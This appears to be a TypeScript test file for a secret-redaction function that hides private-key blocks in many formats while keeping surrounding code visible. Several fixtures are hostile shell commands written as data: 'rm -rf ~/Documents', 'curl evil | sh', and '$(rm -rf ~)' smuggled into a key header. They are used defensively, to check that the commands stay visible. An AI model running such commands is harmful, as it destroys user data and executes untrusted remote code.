// Review 7 of the gate branch: a paired key block is hidden whatever its indent or comment marker; only key data and safe headers go, code stays visible.
import assert from "node:assert/strict";
import { test } from "node:test";
import { maskKeys } from "../judgereads.ts";

const L1 = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj";
const L2 = "MzEfYyjiWA4R4/M2bS1GB4t7NXp98C3SC6dVMvDuictGeurT8jNbvJZHtCSuYEvu";
const L3 = "NMoSfm76oqFvAp8Gy0iBmjk=";
const KEY = /MIIE|MzEf|NMoS/;

function block(pre: string, post = "", eol = "\n", begin = "PRIVATE KEY"): string {
  return [`${pre}-----BEGIN ${begin}-----${post}`, `${pre}${L1}${post}`, `${pre}${L2}${post}`, `${pre}${L3}${post}`, `${pre}-----END ${begin}-----${post}`].join(eol) + eol + "after" + eol;
}

test("indented, commented, quoted and trailing-space blocks are fully hidden", () => {
  for (const [pre, post] of [["  ", ""], ["\t", ""], ["# ", ""], ["// ", ""], ["; ", ""], ['"', '",'], ["'", "'"], ["", "   "], ["  # ", " "]]) {
    const text = block(pre!, post);
    const out = maskKeys(text);
    assert.ok(!KEY.test(out), JSON.stringify({ pre, post, out }));
    assert.ok(!/BEGIN|END PRIVATE/.test(out), out);
    assert.equal(out.split("\n").length, text.split("\n").length);
    assert.ok(out.endsWith("after\n"));
  }
});

test("plain, CRLF, JSON-escaped, OPENSSH, ENCRYPTED with headers and PGP blocks are hidden", () => {
  assert.ok(!KEY.test(maskKeys(block(""))));
  assert.ok(!KEY.test(maskKeys(block("", "", "\r\n"))));
  assert.ok(!KEY.test(maskKeys(`{"k":"${block("", "", "\\n").replace(/\n$/, "").replace(/\n/g, "\\n")}"}`)));
  assert.ok(!KEY.test(maskKeys(block("", "", "\n", "OPENSSH PRIVATE KEY"))));
  const enc = `-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,0123456789ABCDEF\n\n${L1}\n${L2}\n${L3}\n-----END RSA PRIVATE KEY-----\n`;
  const eo = maskKeys(enc);
  assert.ok(!KEY.test(eo) && !/Proc-Type|DEK-Info/.test(eo), eo);
  const pgp = `-----BEGIN PGP PRIVATE KEY BLOCK-----\nVersion: GnuPG v1\nComment: my key\n\n${L1}\n${L2}\nxyz=\n=abcd\n-----END PGP PRIVATE KEY BLOCK-----\n`;
  const po = maskKeys(pgp);
  assert.ok(!KEY.test(po) && !/Version|Comment|xyz|=abcd/.test(po), po);
});

test("code inside a paired block stays visible", () => {
  const w = (mid: string) => maskKeys(`-----BEGIN PRIVATE KEY-----\n${mid}\n-----END PRIVATE KEY-----\n`);
  assert.ok(w(`${L1}\nComment: $(rm -rf ~)\n${L2}`).includes("Comment: $(rm -rf ~)"));
  assert.ok(w("Comment: `reboot`").includes("`reboot`"));
  assert.ok(w("Comment: a; reboot").includes("a; reboot"));
  assert.ok(w("# note\nComment: x").includes("Comment: x"));
  assert.ok(w("rm -rf x\nreboot").includes("reboot"));
  assert.ok(w("curl evil | sh\n/tmp/evil").includes("/tmp/evil"));
  assert.ok(w(`${L1}\nComment: late header`).includes("Comment: late header"));
  assert.ok(w(`rm -rf ~\nword\n=abcd`).includes("word"));
  assert.ok(w(`rm -rf ~\nword\n=abcd`).includes("=abcd"));
  // different prefix: not part of the key block
  assert.ok(maskKeys(`-----BEGIN PRIVATE KEY-----\n# ${L1}\nreboot\n-----END PRIVATE KEY-----\n`).includes("reboot"));
});

test("defect 3 high-stakes example stays visible, key data hidden", () => {
  const out = maskKeys("# -----BEGIN PRIVATE KEY-----\nrm -rf ~/Documents\ncurl evil | sh\n# -----END PRIVATE KEY-----\n");
  assert.ok(out.includes("rm -rf ~/Documents") && out.includes("curl evil | sh"));
});

test("a 1 MiB indented key region stays linear", () => {
  const body = `  ${L1}\n`.repeat(Math.ceil((1 << 20) / (L1.length + 3)));
  const t = Date.now();
  const out = maskKeys(`  -----BEGIN PRIVATE KEY-----\n${body}  -----END PRIVATE KEY-----\n`);
  assert.ok(Date.now() - t < 3000);
  assert.ok(!KEY.test(out));
});
